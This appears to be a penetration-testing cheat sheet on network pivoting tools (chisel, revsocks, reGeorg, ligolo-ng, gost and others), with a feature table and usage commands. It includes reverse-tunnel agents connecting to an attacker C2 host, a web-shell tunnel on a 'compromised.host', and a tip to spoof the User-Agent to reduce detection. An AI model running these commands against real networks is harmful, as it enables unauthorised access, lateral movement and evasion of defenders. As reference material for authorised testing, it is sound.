# Network Pivoting Tools

## Tools Comparison

Comparison table showing platform support (Windows, Linux, macOS), available polling methods (HTTPS, WebSockets), and supported SOCKS versions (4/5).

| Name         | SOCKS4 | SOCKS5 | SOCKET | HTTPS | Web Socket | Windows | Linux | MacOS  | Tun Interface |
| ------------ | ------ | ------ | ------ | ----- | ---------- | ------- | ----- | -----  | ------------  |
| SSH          |     ✅ |     ✅ |     ✅ |    ❌ |         ❌ |     ✅  |   ✅  |     ✅ |           ❌ |
| reGeorg      |     ✅ |     ❌ |     ✅ |    ❌ |         ❌ |     ✅  |   ✅  |     ✅ |           ❌ |
| pivotnacci   |     ✅ |     ✅ |     ❌ |    ✅ |         ❌ |     ✅  |   ✅  |     ✅ |           ❌ |
| wstunnel     |     ✅ |     ✅ |     ❌ |    ✅ |         ✅ |     ✅  |   ✅  |     ✅ |           ❌ |
| chisel       |     ❌ |     ✅ |     ❌ |    ✅ |         ✅ |     ✅  |   ✅  |     ✅ |           ❌ |
| revsocks     |     ❌ |     ✅ |     ✅ |    ✅ |         ✅ |     ✅  |   ✅  |     ✅ |           ❌ |
| ligolo-ng    |     ❌ |     ❌ |     ✅ |    ❌ |         ✅ |     ✅  |   ✅  |     ✅ |           ✅ |
| gost         |     ✅ |     ✅ |     ✅ |    ❌ |         ❌ |     ✅  |   ✅  |     ✅ |           ✅ |
| rpivot       |     ✅ |     ❌ |     ✅ |    ❌ |         ❌ |     ✅  |   ✅  |     ✅ |           ❌ |

## Tools

### wstunnel

* [erebe/wstunnel](https://github.com/erebe/wstunnel) - Tunnel all your traffic over Websocket or HTTP2 - Bypass firewalls/DPI - Static binary available

```ps1
wstunnel server wss://[::]:8080
wstunnel client -L socks5://127.0.0.1:8888 --connection-min-idle 5 wss://myRemoteHost:8080
curl -x socks5h://127.0.0.1:8888 http://google.com/
```

### chisel

* [jpillora/chisel](https://github.com/jpillora/chisel) - A fast TCP/UDP tunnel over HTTP

```powershell
chisel server -p 8008 --reverse
chisel.exe client YOUR_IP:8008 R:socks
```

### revsocks

* [kost/revsocks](https://github.com/kost/revsocks) - Reverse SOCKS5 implementation in Go

Reverse SOCKS using websocket

```ps1
revsocks -listen :8443 -socks 127.0.0.1:1080 -pass SuperSecretPassword -tls -ws
revsocks -connect https://clientIP:8443 -pass SuperSecretPassword -ws
```

Reverse SOCKS using TLS encryption

```ps1
revsocks -listen :8443 -socks 127.0.0.1:1080 -pass SuperSecretPassword
revsocks -connect clientIP:8443 -pass SuperSecretPassword
```

Reverse SOCKS using TCP

```ps1
revsocks -listen :8443 -socks 127.0.0.1:1080 -pass SuperSecretPassword -tls
revsocks -connect clientIP:8443 -pass SuperSecretPassword -tls
```

* Set a strong password on the connection: `-pass Password1234`
* Use an authenticated proxy: `-proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass`
* Define a User-Agent to reduce detections: `-useragent "Mozilla 5.0/IE Windows 10"`

### ssh

```bash
ssh -N -f -D [listenport] [user]@[host]
```

### reGeorg

* [sensepost/reGeorg](https://github.com/sensepost/reGeorg), the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.

```python
python reGeorgSocksProxy.py --listen-port 8080 --url http://compromised.host/shell.jsp
```

* **Step 1**. Upload tunnel.(`aspx|ashx|jsp|php`) to a webserver.
* **Step 2**. Configure you tools to use a socks proxy, use the ip address and port you specified when you started the reGeorgSocksProxy.py

### pivotnacci

* [blackarrowsec/pivotnacci](https://github.com/blackarrowsec/pivotnacci), a tool to make socks connections through HTTP agents.

```powershell
pip3 install pivotnacci
usage: pivotnacci [-h] [-s addr] [-p port] [--verbose] [--ack-message message]
                  [--password password] [--user-agent user_agent]
                  [--header header] [--proxy [protocol://]host[:port]]
                  [--type type] [--polling-interval milliseconds]
                  [--request-tries number] [--retry-interval milliseconds]
                  url

pivotnacci  https://domain.com/agent.php --password "s3cr3t" --polling-interval 2000
```

### ligolo

Instead of using a SOCKS proxy or TCP/UDP forwarders, Ligolo-ng creates a userland network stack using Gvisor.

* [nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng) - An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface.
* [sysdream/ligolo](https://github.com/sysdream/ligolo) - Reverse Tunneling made easy for pentesters.

```ps1
./proxy -h # Help options
./proxy -autocert # Automatically request LetsEncrypt certificates
./proxy -selfcert # Use self-signed certificates
./agent -connect attacker_c2_server.com:11601

ligolo-ng » session 
? Specify a session : 1

interface_create --name ligolo
route_add --name ligolo --route 10.24.0.0/24
tunnel_start --tun ligolo
```

### gost

* [ginuerzh/gost](https://github.com/ginuerzh/gost) - GO Simple Tunnel - a simple tunnel written in golang

```ps1
gost -L=socks5://:1080 # server
gost -L=:8080 -F=socks5://server_ip:1080?notls=true # client
```

### sshuttle

* [sshuttle/sshuttle](https://github.com/sshuttle/sshuttle) - Transparent proxy server that works as a poor man's VPN. Forwards over ssh.

```ps1
sshuttle -vvr user@10.10.10.10 10.1.1.0/24
sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e "ssh -i ~/.ssh/id_rsa" 
```

## References

* [GO Simple Tunnel - Documentation](https://gost.run/en/)
* [Ligolo-ng - Documentation](https://docs.ligolo.ng/)
* [sshutle - Documentation](https://sshuttle.readthedocs.io/en/stable/usage.html)
